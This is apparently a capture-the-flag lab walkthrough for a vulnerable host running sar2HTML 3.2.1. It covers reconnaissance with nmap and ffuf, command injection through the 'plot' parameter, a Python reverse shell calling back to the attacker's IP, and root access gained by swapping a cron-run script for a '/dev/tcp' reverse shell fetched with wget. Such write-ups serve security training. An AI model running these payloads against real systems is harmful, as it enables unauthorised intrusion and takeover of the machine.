---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---


## Reconnaissance

### Nmap scan

Let's perform an `nmap` scan to find the open ports and the services running on the open ports.

```
$ nmap -Pn -p- -A -T5 192.168.179.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-10 13:15 EDT
Warning: 192.168.179.35 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.179.35
Host is up (0.067s latency).
Not shown: 64075 closed tcp ports (conn-refused), 1458 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 319.29 seconds
```

There are two open ports:

| Port | Service |
| ---- | ------- |
| 22   | ssh     |
| 80   | http    |

### Directory enumeration

Let's perform some directory brute forcing using `ffuf` to check what web directories are present.

```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.179.35/FUZZ
________________________________________________

.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 65ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 67ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 791ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 64ms]
phpinfo.php             [Status: 200, Size: 95464, Words: 4716, Lines: 1170, Duration: 118ms]
robots.txt              [Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 66ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 67ms]
:: Progress: [4614/4614] :: Job [1/1] :: 598 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

Let's visit the `robots.txt` page. There's usually something useful there.

![1](https://github.com/user-attachments/assets/6d51d15a-54a7-4127-9843-1d6e0b4560fb)

The `sar2HTML` page is being blocked for crawlers. That is why it did not show up in the `ffuf` scan. 

Let's visit the page.

![2](https://github.com/user-attachments/assets/caf167bf-bfa6-4c50-9fcb-bda6f94fe510)

&nbsp;

## Exploitation

### Searching for relevant exploit.

We can look up exploits for sar2HTML version `3.2.1`.
[This](https://www.exploit-db.com/exploits/47204) exploit shows up:

![3](https://github.com/user-attachments/assets/233e3976-00af-41cd-9de9-098ffd8186b8)

Let's check the exploit using the following URI:

```
192.168.179.35/sar2HTML/index.php?plot=;ls
```

![4](https://github.com/user-attachments/assets/a27a511b-071a-465f-ac79-c29c960bcabf)

### Obtaining a reverse shell

In order to obtain a reverse shell, we need to first set up a `nc` listener.

```
$ nc -nlvp 9999                     
listening on [any] 9999 ...
```

Now, we can enter the following URI:

```
192.168.179.35/sar2HTML/index.php?plot=;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.234",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Let's check back on our listener.

```
$ nc -nlvp 9999                     
listening on [any] 9999 ...
connect to [192.168.45.234] from (UNKNOWN) [192.168.179.35] 34638
bash: cannot set terminal process group (975): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sar:/var/www/html/sar2HTML$ 
```

&nbsp;

## Post Exploitation

### local.txt

```
www-data@sar:/var/www/html/sar2HTML$ cat /home/local.txt
cat /home/local.txt
e6f25e304acccc7b3b947383c66f2aef
```

### Privilege Escalation

#### Checking scheduled Cron jobs

We can check if there are any Cron jobs scheduled by displaying the contents of the `/etc/crontab` file.

```
www-data@sar:/var/www/html/sar2HTML$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
```

The `./finally.sh` file is executed every 5th minute with `root` privileges.

We can verify this using [crontab guru](https://crontab.guru/).

![5](https://github.com/user-attachments/assets/49a4c19a-6d43-435f-812a-b897baa8ee60)

Unfortunately, we cannot edit the `./finally.sh` file.
Let's check what it is doing.

```
www-data@sar:/var/www/html$ cat finally.sh
cat finally.sh
#!/bin/sh

./write.sh
```

So it execute another file called `./write.sh`.

#### Exploiting scheduled Cron job

Let's delete this `./write.sh` file.

```
www-data@sar:/var/www/html$ rm write.sh
rm write.sh
```

Now, in our attacker machine we can create another `./write.sh` file containing a reverse shell script.

```bash title="write.sh"
#!/bin/bash  

bash -i >& /dev/tcp/192.168.45.234/9998 0>&1
```

Next we can transport the file to the target.

```
www-data@sar:/var/www/html$ wget http://192.168.45.234:8000/write.sh
wget http://192.168.45.234:8000/write.sh
--2024-08-10 23:29:05--  http://192.168.45.234:8000/write.sh
Connecting to 192.168.45.234:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 60 [text/x-sh]
Saving to: 'write.sh'

     0K                                                       100% 15.0M=0s

2024-08-10 23:29:05 (15.0 MB/s) - 'write.sh' saved [60/60]
```

Let's make the file executable.

```
www-data@sar:/var/www/html$ chmod +x write.sh
chmod +x write.sh
```

Now, we have to set up a `nc` listener and wait.

```
$ nc -nlvp 9998                  
listening on [any] 9998 ...
```

After some time the Cron job will be executed and we will obtain a reverse shell with `root` privileges.

```
$ nc -nlvp 9998                  
listening on [any] 9998 ...
connect to [192.168.45.234] from (UNKNOWN) [192.168.179.35] 54846
bash: cannot set terminal process group (3286): Inappropriate ioctl for device
bash: no job control in this shell
root@sar:/var/www/html# 
```

### proof.txt

```
root@sar:/var/www/html# cd /root
cd /root
root@sar:~# 
```

```
root@sar:~# cat proof.txt
cat proof.txt
c07959ab9321d3dd66064bddacc012ea
```
